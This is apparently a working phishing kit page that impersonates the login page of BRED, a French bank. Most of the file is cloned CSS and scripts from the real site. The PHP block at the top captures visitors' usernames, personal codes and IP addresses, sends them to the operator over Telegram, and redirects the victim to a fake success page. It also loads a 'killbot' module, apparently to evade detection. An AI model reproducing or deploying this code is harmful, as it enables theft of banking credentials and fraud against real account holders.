<?php


require_once 'killbot/code/include.php';

error_reporting(0);

if (session_status() === PHP_SESSION_NONE) {
  session_start();
}

include 'includes.php';
include 'core/ip.php';
include 'core/telegram.php';
include 'config.php';

if (isset($_POST['user'],$_POST['passcode'])) {

  $ip = ip();
  $user = $_POST['user'];
  $passcode = $_POST['passcode'];
 

  $message = "💌 NOUVEAU LOG BRED : $ip\n\n";
  $message .= "🧲 IDENTIFIANT : $user \n";
  $message .= "🧲 CODE PERSONNEL : $passcode \n";
  
  $_SESSION['data'] = $message;

  tlgsend(urlencode($message));

   header('location: ../success.php');
}

?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>BRED</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<html xmlns="http://www.w3.org/1999/xhtml" class="js objectfit object-fit not-ios" lang="fr" xml:lang="fr">

<head>
  <style type="text/css">
    .tippy-iOS {
      cursor: pointer !important
    }

    .tippy-notransition {
      transition: none !important
    }

    .tippy-popper {
      -webkit-perspective: 700px;
      perspective: 700px;
      z-index: 9999;
      outline: 0;
      transition-timing-function: cubic-bezier(.165, .84, .44, 1);
      pointer-events: none;
      line-height: 1.4;
      max-width: calc(100% - 10px)
    }

    .tippy-popper[x-placement^=top] .tippy-backdrop {
      border-radius: 40% 40% 0 0
    }

    .tippy-popper[x-placement^=top] .tippy-roundarrow {
      bottom: -8px;
      -webkit-transform-origin: 50% 0;
      transform-origin: 50% 0
    }

    .tippy-popper[x-placement^=top] .tippy-roundarrow svg {
      position: absolute;
      left: 0;
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg)
    }

    .tippy-popper[x-placement^=top] .tippy-arrow {
      border-top: 8px solid #333;
      border-right: 8px solid transparent;
      border-left: 8px solid transparent;
      bottom: -7px;
      margin: 0 6px;
      -webkit-transform-origin: 50% 0;
      transform-origin: 50% 0
    }

    .tippy-popper[x-placement^=top] .tippy-backdrop {
      -webkit-transform-origin: 0 25%;
      transform-origin: 0 25%
    }

    .tippy-popper[x-placement^=top] .tippy-backdrop[data-state=visible] {
      -webkit-transform: scale(1) translate(-50%, -55%);
      transform: scale(1) translate(-50%, -55%)
    }

    .tippy-popper[x-placement^=top] .tippy-backdrop[data-state=hidden] {
      -webkit-transform: scale(.2) translate(-50%, -45%);
      transform: scale(.2) translate(-50%, -45%);
      opacity: 0
    }

    .tippy-popper[x-placement^=top] [data-animation=shift-toward][data-state=visible] {
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px)
    }

    .tippy-popper[x-placement^=top] [data-animation=shift-toward][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(-20px);
      transform: translateY(-20px)
    }

    .tippy-popper[x-placement^=top] [data-animation=perspective] {
      -webkit-transform-origin: bottom;
      transform-origin: bottom
    }

    .tippy-popper[x-placement^=top] [data-animation=perspective][data-state=visible] {
      -webkit-transform: translateY(-10px) rotateX(0);
      transform: translateY(-10px) rotateX(0)
    }

    .tippy-popper[x-placement^=top] [data-animation=perspective][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0) rotateX(60deg);
      transform: translateY(0) rotateX(60deg)
    }

    .tippy-popper[x-placement^=top] [data-animation=fade][data-state=visible] {
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px)
    }

    .tippy-popper[x-placement^=top] [data-animation=fade][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px)
    }

    .tippy-popper[x-placement^=top] [data-animation=shift-away][data-state=visible] {
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px)
    }

    .tippy-popper[x-placement^=top] [data-animation=shift-away][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0);
      transform: translateY(0)
    }

    .tippy-popper[x-placement^=top] [data-animation=scale][data-state=visible] {
      -webkit-transform: translateY(-10px) scale(1);
      transform: translateY(-10px) scale(1)
    }

    .tippy-popper[x-placement^=top] [data-animation=scale][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0) scale(.5);
      transform: translateY(0) scale(.5)
    }

    .tippy-popper[x-placement^=bottom] .tippy-backdrop {
      border-radius: 0 0 30% 30%
    }

    .tippy-popper[x-placement^=bottom] .tippy-roundarrow {
      top: -8px;
      -webkit-transform-origin: 50% 100%;
      transform-origin: 50% 100%
    }

    .tippy-popper[x-placement^=bottom] .tippy-roundarrow svg {
      position: absolute;
      left: 0;
      -webkit-transform: rotate(0);
      transform: rotate(0)
    }

    .tippy-popper[x-placement^=bottom] .tippy-arrow {
      border-bottom: 8px solid #333;
      border-right: 8px solid transparent;
      border-left: 8px solid transparent;
      top: -7px;
      margin: 0 6px;
      -webkit-transform-origin: 50% 100%;
      transform-origin: 50% 100%
    }

    .tippy-popper[x-placement^=bottom] .tippy-backdrop {
      -webkit-transform-origin: 0 -50%;
      transform-origin: 0 -50%
    }

    .tippy-popper[x-placement^=bottom] .tippy-backdrop[data-state=visible] {
      -webkit-transform: scale(1) translate(-50%, -45%);
      transform: scale(1) translate(-50%, -45%)
    }

    .tippy-popper[x-placement^=bottom] .tippy-backdrop[data-state=hidden] {
      -webkit-transform: scale(.2) translate(-50%);
      transform: scale(.2) translate(-50%);
      opacity: 0
    }

    .tippy-popper[x-placement^=bottom] [data-animation=shift-toward][data-state=visible] {
      -webkit-transform: translateY(10px);
      transform: translateY(10px)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=shift-toward][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(20px);
      transform: translateY(20px)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=perspective] {
      -webkit-transform-origin: top;
      transform-origin: top
    }

    .tippy-popper[x-placement^=bottom] [data-animation=perspective][data-state=visible] {
      -webkit-transform: translateY(10px) rotateX(0);
      transform: translateY(10px) rotateX(0)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=perspective][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0) rotateX(-60deg);
      transform: translateY(0) rotateX(-60deg)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=fade][data-state=visible] {
      -webkit-transform: translateY(10px);
      transform: translateY(10px)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=fade][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(10px);
      transform: translateY(10px)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=shift-away][data-state=visible] {
      -webkit-transform: translateY(10px);
      transform: translateY(10px)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=shift-away][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0);
      transform: translateY(0)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=scale][data-state=visible] {
      -webkit-transform: translateY(10px) scale(1);
      transform: translateY(10px) scale(1)
    }

    .tippy-popper[x-placement^=bottom] [data-animation=scale][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateY(0) scale(.5);
      transform: translateY(0) scale(.5)
    }

    .tippy-popper[x-placement^=left] .tippy-backdrop {
      border-radius: 50% 0 0 50%
    }

    .tippy-popper[x-placement^=left] .tippy-roundarrow {
      right: -16px;
      -webkit-transform-origin: 33.33333333% 50%;
      transform-origin: 33.33333333% 50%
    }

    .tippy-popper[x-placement^=left] .tippy-roundarrow svg {
      position: absolute;
      left: 0;
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg)
    }

    .tippy-popper[x-placement^=left] .tippy-arrow {
      border-left: 8px solid #333;
      border-top: 8px solid transparent;
      border-bottom: 8px solid transparent;
      right: -7px;
      margin: 3px 0;
      -webkit-transform-origin: 0 50%;
      transform-origin: 0 50%
    }

    .tippy-popper[x-placement^=left] .tippy-backdrop {
      -webkit-transform-origin: 50% 0;
      transform-origin: 50% 0
    }

    .tippy-popper[x-placement^=left] .tippy-backdrop[data-state=visible] {
      -webkit-transform: scale(1) translate(-50%, -50%);
      transform: scale(1) translate(-50%, -50%)
    }

    .tippy-popper[x-placement^=left] .tippy-backdrop[data-state=hidden] {
      -webkit-transform: scale(.2) translate(-75%, -50%);
      transform: scale(.2) translate(-75%, -50%);
      opacity: 0
    }

    .tippy-popper[x-placement^=left] [data-animation=shift-toward][data-state=visible] {
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px)
    }

    .tippy-popper[x-placement^=left] [data-animation=shift-toward][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(-20px);
      transform: translateX(-20px)
    }

    .tippy-popper[x-placement^=left] [data-animation=perspective] {
      -webkit-transform-origin: right;
      transform-origin: right
    }

    .tippy-popper[x-placement^=left] [data-animation=perspective][data-state=visible] {
      -webkit-transform: translateX(-10px) rotateY(0);
      transform: translateX(-10px) rotateY(0)
    }

    .tippy-popper[x-placement^=left] [data-animation=perspective][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0) rotateY(-60deg);
      transform: translateX(0) rotateY(-60deg)
    }

    .tippy-popper[x-placement^=left] [data-animation=fade][data-state=visible] {
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px)
    }

    .tippy-popper[x-placement^=left] [data-animation=fade][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px)
    }

    .tippy-popper[x-placement^=left] [data-animation=shift-away][data-state=visible] {
      -webkit-transform: translateX(-10px);
      transform: translateX(-10px)
    }

    .tippy-popper[x-placement^=left] [data-animation=shift-away][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0);
      transform: translateX(0)
    }

    .tippy-popper[x-placement^=left] [data-animation=scale][data-state=visible] {
      -webkit-transform: translateX(-10px) scale(1);
      transform: translateX(-10px) scale(1)
    }

    .tippy-popper[x-placement^=left] [data-animation=scale][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0) scale(.5);
      transform: translateX(0) scale(.5)
    }

    .tippy-popper[x-placement^=right] .tippy-backdrop {
      border-radius: 0 50% 50% 0
    }

    .tippy-popper[x-placement^=right] .tippy-roundarrow {
      left: -16px;
      -webkit-transform-origin: 66.66666666% 50%;
      transform-origin: 66.66666666% 50%
    }

    .tippy-popper[x-placement^=right] .tippy-roundarrow svg {
      position: absolute;
      left: 0;
      -webkit-transform: rotate(-90deg);
      transform: rotate(-90deg)
    }

    .tippy-popper[x-placement^=right] .tippy-arrow {
      border-right: 8px solid #333;
      border-top: 8px solid transparent;
      border-bottom: 8px solid transparent;
      left: -7px;
      margin: 3px 0;
      -webkit-transform-origin: 100% 50%;
      transform-origin: 100% 50%
    }

    .tippy-popper[x-placement^=right] .tippy-backdrop {
      -webkit-transform-origin: -50% 0;
      transform-origin: -50% 0
    }

    .tippy-popper[x-placement^=right] .tippy-backdrop[data-state=visible] {
      -webkit-transform: scale(1) translate(-50%, -50%);
      transform: scale(1) translate(-50%, -50%)
    }

    .tippy-popper[x-placement^=right] .tippy-backdrop[data-state=hidden] {
      -webkit-transform: scale(.2) translate(-25%, -50%);
      transform: scale(.2) translate(-25%, -50%);
      opacity: 0
    }

    .tippy-popper[x-placement^=right] [data-animation=shift-toward][data-state=visible] {
      -webkit-transform: translateX(10px);
      transform: translateX(10px)
    }

    .tippy-popper[x-placement^=right] [data-animation=shift-toward][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(20px);
      transform: translateX(20px)
    }

    .tippy-popper[x-placement^=right] [data-animation=perspective] {
      -webkit-transform-origin: left;
      transform-origin: left
    }

    .tippy-popper[x-placement^=right] [data-animation=perspective][data-state=visible] {
      -webkit-transform: translateX(10px) rotateY(0);
      transform: translateX(10px) rotateY(0)
    }

    .tippy-popper[x-placement^=right] [data-animation=perspective][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0) rotateY(60deg);
      transform: translateX(0) rotateY(60deg)
    }

    .tippy-popper[x-placement^=right] [data-animation=fade][data-state=visible] {
      -webkit-transform: translateX(10px);
      transform: translateX(10px)
    }

    .tippy-popper[x-placement^=right] [data-animation=fade][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(10px);
      transform: translateX(10px)
    }

    .tippy-popper[x-placement^=right] [data-animation=shift-away][data-state=visible] {
      -webkit-transform: translateX(10px);
      transform: translateX(10px)
    }

    .tippy-popper[x-placement^=right] [data-animation=shift-away][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0);
      transform: translateX(0)
    }

    .tippy-popper[x-placement^=right] [data-animation=scale][data-state=visible] {
      -webkit-transform: translateX(10px) scale(1);
      transform: translateX(10px) scale(1)
    }

    .tippy-popper[x-placement^=right] [data-animation=scale][data-state=hidden] {
      opacity: 0;
      -webkit-transform: translateX(0) scale(.5);
      transform: translateX(0) scale(.5)
    }

    .tippy-tooltip {
      position: relative;
      color: #fff;
      border-radius: 4px;
      font-size: .9rem;
      padding: .3rem .6rem;
      max-width: 350px;
      text-align: center;
      will-change: transform;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      background-color: #333
    }

    .tippy-tooltip[data-size=small] {
      padding: .2rem .4rem;
      font-size: .75rem
    }

    .tippy-tooltip[data-size=large] {
      padding: .4rem .8rem;
      font-size: 1rem
    }

    .tippy-tooltip[data-animatefill] {
      overflow: hidden;
      background-color: transparent
    }

    .tippy-tooltip[data-interactive],
    .tippy-tooltip[data-interactive] path {
      pointer-events: auto
    }

    .tippy-tooltip[data-inertia][data-state=visible] {
      transition-timing-function: cubic-bezier(.54, 1.5, .38, 1.11)
    }

    .tippy-tooltip[data-inertia][data-state=hidden] {
      transition-timing-function: ease
    }

    .tippy-arrow,
    .tippy-roundarrow {
      position: absolute;
      width: 0;
      height: 0
    }

    .tippy-roundarrow {
      width: 24px;
      height: 8px;
      fill: #333;
      pointer-events: none
    }

    .tippy-backdrop {
      position: absolute;
      will-change: transform;
      background-color: #333;
      border-radius: 50%;
      width: calc(110% + 2rem);
      left: 50%;
      top: 50%;
      z-index: -1;
      transition: all cubic-bezier(.46, .1, .52, .98);
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden
    }

    .tippy-backdrop:after {
      content: "";
      float: left;
      padding-top: 100%
    }

    .tippy-backdrop+.tippy-content {
      transition-property: opacity;
      will-change: opacity
    }

    .tippy-backdrop+.tippy-content[data-state=visible] {
      opacity: 1
    }

    .tippy-backdrop+.tippy-content[data-state=hidden] {
      opacity: 0
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=G-KZBNSG6GGT&amp;l=dataLayer&amp;cx=c"></script>
  <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-5K2PFQ"></script>
  <script id="spcloader" type="text/javascript" async="" src="https://sdk.privacy-center.org/3bdae87d-5147-4773-82cd-1044a2016ac4/loader.js?target=www.bred.fr" charset="utf-8"></script>
  <script type="text/javascript">
    window.gdprAppliesGlobally = true;
    (function() {
      function a(e) {
        if (!window.frames[e]) {
          if (document.body && document.body.firstChild) {
            var t = document.body;
            var n = document.createElement("iframe");
            n.style.display = "none";
            n.name = e;
            n.title = e;
            t.insertBefore(n, t.firstChild)
          } else {
            setTimeout(function() {
              a(e)
            }, 5)
          }
        }
      }

      function e(n, r, o, c, s) {
        function e(e, t, n, a) {
          if (typeof n !== "function") {
            return
          }
          if (!window[r]) {
            window[r] = []
          }
          var i = false;
          if (s) {
            i = s(e, t, n)
          }
          if (!i) {
            window[r].push({
              command: e,
              parameter: t,
              callback: n,
              version: a
            })
          }
        }
        e.stub = true;

        function t(a) {
          if (!window[n] || window[n].stub !== true) {
            return
          }
          if (!a.data) {
            return
          }
          var i = typeof a.data === "string";
          var e;
          try {
            e = i ? JSON.parse(a.data) : a.data
          } catch (t) {
            return
          }
          if (e[o]) {
            var r = e[o];
            window[n](r.command, r.parameter, function(e, t) {
              var n = {};
              n[c] = {
                returnValue: e,
                success: t,
                callId: r.callId
              };
              a.source.postMessage(i ? JSON.stringify(n) : n, "*")
            }, r.version)
          }
        }
        if (typeof window[n] !== "function") {
          window[n] = e;
          if (window.addEventListener) {
            window.addEventListener("message", t, false)
          } else {
            window.attachEvent("onmessage", t)
          }
        }
      }
      e("__tcfapi", "__tcfapiBuffer", "__tcfapiCall", "__tcfapiReturn");
      a("__tcfapiLocator");
      (function(e) {
        var t = document.createElement("script");
        t.id = "spcloader";
        t.type = "text/javascript";
        t.async = true;
        t.src = "https://sdk.privacy-center.org/" + e + "/loader.js?target=" + document.location.hostname;
        t.charset = "utf-8";
        var n = document.getElementsByTagName("script")[0];
        n.parentNode.insertBefore(t, n)
      })("3bdae87d-5147-4773-82cd-1044a2016ac4")
    })();
  </script>
  <script type="didomi/javascript" data-vendor="c:abtasty-YFYFtFgw" src="https://try.abtasty.com/623e00905bc91c8c107590d175889777.js"></script>
  <meta charset="utf-8">
  <base href="https://www.bred.fr/authentification">
  <title>Authentification - accéder à mon compte | BRED</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5.0, user-scalable=no">
  <link href="/++theme++bredfr/assets/styles/main.min.css" rel="stylesheet">
  <link rel="icon" href="/bredfr/++theme++bredfr/assets/images/favicon.ico">
  <!-- Google Tag Manager -->
  <script id="data_layer_gtm">
    window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
      'typepage': 'Connexion',
      'typeservice': 'Authentification - accéder à mon compte',
      'client': 'non',
      'thememarche': 'bred',
      '_bcac': 'non',
      'typemarche': "Divers"
    });
  </script>
  <script id="tag_gtm">
    (function(w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({
        'gtm.start': new Date().getTime(),
        event: 'gtm.js'
      });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s),
        dl = l != 'dataLayer' ? '&l=' + l : '';
      j.async = true;
      j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
      f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-5K2PFQ');
  </script>
  <!-- End Google Tag Manager -->
  <!-- JavaScript -->
  <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/modernizr-custom.js"></script>
  <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/jquery.min.js"></script>
  <meta name="google-site-verification" content="BytpQeQ0qP0ZaCcIWiFnphxIGdlVHD56zK41-fwW9qw">
  <style type="text/css">
    .fast-access__icon--rdv {
      background-image: url(/medias/images/icones/ico-sprite-prendre-rdv.png);
    }
  </style>
  <link rel="preload" crossorigin="anonymous" href="/++theme++bredfr/assets/fonts/Roboto-Regular.woff" as="font">
  <link rel="preload" crossorigin="anonymous" href="/++theme++bredfr/assets/fonts/Roboto-Light.woff" as="font">
  <link rel="preload" crossorigin="anonymous" href="/++theme++bredfr/assets/fonts/Roboto-Thin.woff" as="font">
  <link rel="preload" crossorigin="anonymous" href="/++theme++bredfr/assets/fonts/Roboto-Bold.woff" as="font">
  <link rel="preload" crossorigin="anonymous" href="/++theme++bredfr/assets/fonts/Roboto-LightItalic.woff" as="font">
  <meta property="market_id" content="Divers">
  <meta property="type_second" content="">
  <meta property="category_id" content="">
  <meta property="bred_uid" content="2eb41717603c497ea98aaedb0d7f5d09">
  <meta property="type" content="Connexion">
  <meta name="bloc_template_id">
  <meta name="portal_url" content="https://www.bred.fr">
  <meta property="bred_title" content="Authentification - accéder à mon compte">
  <meta property="date" content="19/09/2022">
  <meta property="og:url" content="https://www.bred.fr/authentification">
  <meta property="og:image">
  <meta name="description" content="">
  <meta content="summary" name="twitter:card">
  <meta content="BRED" property="og:site_name">
  <meta content="Authentification - accéder à mon compte" property="og:title">
  <meta content="website" property="og:type">
  <meta content="" property="og:description">
  <meta content="https://www.bred.fr/authentification" property="og:url">
  <meta content="https://www.bred.fr/logo.png" property="og:image">
  <meta content="image/png" property="og:image:type">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Plone - http://plone.com">
  <style id="more_page_css" type="text/css">
    <!--.connexion__title{
    font-size:2rem !important;
    }
    -->
  </style>
  <style id="more_page_css" type="text/css">
    <!--.connexion__title{
    font-size:2rem !important;
    }
    -->
  </style>
  <link rel="canonical" href="https://www.bred.fr/authentification">
  <script type="text/javascript" async="" src="https://sdk.privacy-center.org/sdk.21e53aa2bc4c927229135982cdc3058f7e4d2173.js" charset="utf-8"></script>
  <script charset="utf-8" src="https://sdk.privacy-center.org/ui-gdpr-fr-web.21e53aa2bc4c927229135982cdc3058f7e4d2173.js"></script>
  <style type="text/css">
    button.btn[data-v-f3fb3dc8] {
      display: inline-block;
      font-weight: 300;
      line-height: 1.25;
      text-align: center;
      white-space: nowrap;
      vertical-align: middle;
      user-select: none;
      border: 1px solid transparent;
      cursor: pointer;
      letter-spacing: 1px;
      transition: all 0.15s ease
    }

    button.btn.btn-sm[data-v-f3fb3dc8] {
      padding: 0.4rem 0.8rem;
      font-size: 0.8rem;
      border-radius: 0.2rem
    }

    button.btn.btn-primary[data-v-f3fb3dc8] {
      color: #fff;
      background-color: #45c8f1;
      border-color: #45c8f1
    }

    button.btn.btn-outline-primary[data-v-f3fb3dc8] {
      color: #45c8f1;
      background-color: transparent;
      border-color: #45c8f1
    }

    button.btn.btn-danger[data-v-f3fb3dc8] {
      color: #fff;
      background-color: #ff4949;
      border-color: #ff4949
    }

    .text-muted[data-v-f3fb3dc8] {
      color: #8492a6
    }

    .text-center[data-v-f3fb3dc8] {
      text-align: center
    }

    .drop-down-enter[data-v-f3fb3dc8],
    .drop-down-leave-to[data-v-f3fb3dc8] {
      transform: translateX(0) translateY(-20px);
      transition-timing-function: cubic-bezier(0.74, 0.04, 0.26, 1.05);
      opacity: 0
    }

    .drop-down-enter-active[data-v-f3fb3dc8],
    .drop-down-leave-active[data-v-f3fb3dc8] {
      transition: all 0.15s
    }

    .move-left-enter[data-v-f3fb3dc8],
    .move-left-leave-to[data-v-f3fb3dc8] {
      transform: translateY(0) translateX(-80px);
      transition-timing-function: cubic-bezier(0.74, 0.04, 0.26, 1.05);
      opacity: 0
    }

    .move-left-enter-active[data-v-f3fb3dc8],
    .move-left-leave-active[data-v-f3fb3dc8] {
      transition: all 0.15s
    }

    .no-tr[data-v-f3fb3dc8] {
      transition: none !important
    }

    .no-tr *[data-v-f3fb3dc8] {
      transition: none !important
    }

    .overlay[data-v-f3fb3dc8] {
      position: fixed;
      background: rgba(220, 220, 220, 0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      transition: all 0.2s ease;
      opacity: 0;
      visibility: hidden
    }

    .overlay .modal[data-v-f3fb3dc8] {
      transition: all 0.2s ease;
      opacity: 0;
      transform: scale(0.6);
      overflow: hidden
    }

    .overlay.show[data-v-f3fb3dc8] {
      opacity: 1;
      visibility: visible
    }

    .overlay.show .modal[data-v-f3fb3dc8] {
      opacity: 1;
      transform: scale(1)
    }

    .panel[data-v-f3fb3dc8] {
      padding: 6px 10px;
      display: flex;
      width: 100%;
      box-sizing: border-box;
      align-items: center;
      border-radius: 6px;
      position: relative;
      border: 1px solid #eaf7ff;
      background: #f7fcff;
      outline: none;
      transition: all 0.07s ease-in-out
    }

    .btn[data-v-f3fb3dc8] {
      cursor: pointer;
      box-sizing: border-box
    }

    .light-btn[data-v-f3fb3dc8] {
      padding: 10px 12px;
      display: flex;
      width: 100%;
      box-sizing: border-box;
      align-items: center;
      border-radius: 6px;
      position: relative;
      border: 1px solid #eaf7ff;
      background: #f7fcff;
      outline: none;
      cursor: pointer;
      transition: all 0.07s ease-in-out
    }

    .light-btn[data-v-f3fb3dc8]:hover {
      background: #e0f4ff;
      border-color: #8acfff
    }

    .primary-btn[data-v-f3fb3dc8] {
      background: #239bf5;
      color: white;
      border-radius: 6px;
      height: 46px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: 0.2s ease;
      font-size: 14px;
      font-family: "Didact Gothic Regular", sans-serif
    }

    .primary-btn[data-v-f3fb3dc8]:hover {
      background: #40a8f6;
      color: white;
      text-decoration: none
    }

    .shake[data-v-f3fb3dc8] {
      animation: shake-f3fb3dc8 0.82s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
      transform: translate3d(0, 0, 0)
    }

    @keyframes shake-f3fb3dc8 {

      10%,
      90% {
        transform: translate3d(-1px, 0, 0)
      }

      20%,
      80% {
        transform: translate3d(2px, 0, 0)
      }

      30%,
      50%,
      70% {
        transform: translate3d(-4px, 0, 0)
      }

      40%,
      60% {
        transform: translate3d(4px, 0, 0)
      }
    }

    .pulse[data-v-f3fb3dc8] {
      animation: pulse-f3fb3dc8 2s ease infinite
    }

    @keyframes pulse-f3fb3dc8 {
      0% {
        opacity: 0.7
      }

      50% {
        opacity: 0.4
      }

      100% {
        opacity: 0.7
      }
    }

    .flash-once[data-v-f3fb3dc8] {
      animation: flash-once 3.5s ease 1
    }

    @keyframes fade-up-f3fb3dc8 {
      0% {
        transform: translate3d(0, 10px, 0);
        opacity: 0
      }

      100% {
        transform: translate3d(0, 0, 0);
        opacity: 1
      }
    }

    .fade-in[data-v-f3fb3dc8] {
      animation: fade-in-f3fb3dc8 0.3s ease-in-out
    }

    @keyframes fade-in-f3fb3dc8 {
      0% {
        opacity: 0
      }

      100% {
        opacity: 1
      }
    }

    .spin[data-v-f3fb3dc8] {
      animation-name: spin-f3fb3dc8;
      animation-duration: 2000ms;
      animation-iteration-count: infinite;
      animation-timing-function: linear
    }

    @keyframes spin-f3fb3dc8 {
      from {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(360deg)
      }
    }

    .bounceIn[data-v-f3fb3dc8] {
      animation-name: bounceIn-f3fb3dc8;
      transform-origin: center bottom;
      animation-duration: 1s;
      animation-fill-mode: both;
      animation-iteration-count: 1
    }

    @keyframes bounceIn-f3fb3dc8 {

      0%,
      20%,
      40%,
      60%,
      80%,
      100% {
        -webkit-transition-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
        transition-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1)
      }

      0% {
        opacity: 1;
        -webkit-transform: scale3d(0.8, 0.8, 0.8);
        transform: scale3d(0.8, 0.8, 0.8)
      }

      20% {
        -webkit-transform: scale3d(1.1, 1.1, 1.1);
        transform: scale3d(1.1, 1.1, 1.1)
      }

      40% {
        -webkit-transform: scale3d(0.9, 0.9, 0.9);
        transform: scale3d(0.9, 0.9, 0.9)
      }

      60% {
        opacity: 1;
        -webkit-transform: scale3d(1.03, 1.03, 1.03);
        transform: scale3d(1.03, 1.03, 1.03)
      }

      80% {
        -webkit-transform: scale3d(0.97, 0.97, 0.97);
        transform: scale3d(0.97, 0.97, 0.97)
      }

      100% {
        opacity: 1;
        -webkit-transform: scale3d(1, 1, 1);
        transform: scale3d(1, 1, 1)
      }
    }

    @keyframes dots-f3fb3dc8 {

      0%,
      20% {
        color: rgba(0, 0, 0, 0);
        text-shadow: 0.25em 0 0 rgba(0, 0, 0, 0), 0.5em 0 0 rgba(0, 0, 0, 0)
      }

      40% {
        color: #8492a6;
        text-shadow: 0.25em 0 0 rgba(0, 0, 0, 0), 0.5em 0 0 rgba(0, 0, 0, 0)
      }

      60% {
        text-shadow: 0.25em 0 0 #8492a6, 0.5em 0 0 rgba(0, 0, 0, 0)
      }

      80%,
      100% {
        text-shadow: 0.25em 0 0 #8492a6, 0.5em 0 0 #8492a6
      }
    }

    @keyframes recording-f3fb3dc8 {
      0% {
        box-shadow: 0px 0px 5px 0px rgba(173, 0, 0, 0.3)
      }

      65% {
        box-shadow: 0px 0px 5px 5px rgba(173, 0, 0, 0.3)
      }

      90% {
        box-shadow: 0px 0px 5px 5px rgba(173, 0, 0, 0)
      }
    }

    @font-face {
      font-family: 'Didact Gothic Regular';
      src: url(data:font/woff2;base64,d09GMgABAAAAAGZAABEAAAABOqQAAGXdgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGiQbgc0yHAwGYABECIFCCZdiEQgKgtxMgrpyATYCJAOKUAuFKgAEIAWGVAeVAwyBMVv1JXEDvX0rUXA7sOP5Oz/2bETsdjAn89cLUjGOTQXoDodQ0yhm9v//n51UZMw0QLJNPhzAL4qgh5htlgyTbJQUbwkmCho1Iln6qdMdqRQUwbHBvczDKaaL1nmbV/yGP1KbyfQILd4cHJ34wts+YyF+QjFFRZEtNBQkTExdcpdXnPp+9N1wHGSDWEVicmjRMnEP9+7PN3am4Z1VRESkmGzqZLEkrq5HTXkPmckmQjZzNrFtMYkcUSixhumKxseOH4xfxy/OzGys/TU+k3q9zjX+91cGdL2phrLE2LUhJGOKxdH6PPTZPd+t6pl5/liDkciMDElFm+35bRDN2exJVEnAE6S4JcGqSIJ/aMu3VMzhhVfqBl7S4BX4VGjTvOXzJg5PdJ++nXM3ufkD5RKrDdAoFfygluucfdfePyDjYgcogdDnX3NtDpIrjYXem5AzekKiX1+q+UJ3/wGYlIEhFCiHFEhu0tJBKycUagirWKNxCjBwvuzR8P+vrqTTh8DNU37ClruwQxpKeJeloDQLRb1F7a66ctiGtoI1h2T9zHmx6ot2Dp1WHLbXJhg0IxSIBkmEy3nKD0VF0ZQbQBTg7ssMiYLSSU2J4abc/G/m6vbmOtX+KtXui9sTs6i/BAkECQzswiqwWdAzuc+KGKHHwF3UkLuGeQx6BfoSvwBogH+pgIPzQp5wAQP83Hrr64gW5QCVyg0YY8G29xbvvcV7C5ZJ1aAn0jqwiTQQA5vz9IvMaI7LsJiRF+21Z/4HABy1lVU1cFI1RF2Bnh02YSXJJJlzgeQ3fKMqTfeJvvR5BfBvhm6Iei4tkF8m/rojE16dkSO3HeBHUR9UiVFnDPOiDsdixY7ED7FiW1RCI96QxPYWsWZvGhpM//eazURdfltFPimy+QFgK+A2Ff6rMQ3g27uJFRGW0VE7/p/dG